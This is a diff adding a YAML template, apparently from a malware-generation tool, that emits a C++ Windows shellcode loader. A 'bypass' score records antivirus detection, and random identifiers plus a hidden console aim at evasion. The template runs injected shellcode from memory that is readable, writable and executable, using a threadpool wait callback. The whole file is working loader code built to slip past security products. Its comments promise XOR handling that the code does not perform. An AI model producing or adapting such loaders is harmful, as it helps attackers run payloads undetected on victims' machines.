@@ -1,0 +1,33 @@
+name: CPP-EXE-Windows-XOR-Yes-MemoryEnforcement
+time: 1639581616
+bypass: 12/72
+language: cpp
+build: ~
+process: exe
+set:
+  #下面两个都要从写
+  shellcode: kwargs.get('shellcode')  #执行xor运行
+  r1: randoms().EnglishAlphabet(17)   #随机字符
+  r2: randoms().EnglishAlphabet(12)   #随机字符
+  r3: randoms().EnglishAlphabet(13)   #随机字符
+  r4: randoms().EnglishAlphabet(14)   #随机字符
+include:
+  - '#include <windows.h>'
+  - '#include <threadpoolapiset.h>'
+pragma:
+  - '#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")'
+define: ~
+class: ~
+function:
+  - |
+    int main()
+    {
+    unsigned char {{r1}}[] = "{{shellcode}}";
+    HANDLE {{r2}} = CreateEvent(NULL, FALSE, TRUE, NULL);
+    LPVOID {{r3}} = VirtualAlloc(NULL, sizeof({{r1}}), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    RtlMoveMemory({{r3}}, {{r1}}, sizeof({{r1}}));
+    PTP_WAIT {{r4}} = CreateThreadpoolWait((PTP_WAIT_CALLBACK){{r3}}, NULL, NULL);
+    SetThreadpoolWait({{r4}}, {{r2}}, NULL);
+    WaitForSingleObject({{r2}}, INFINITE);
+    return 0;
+    }
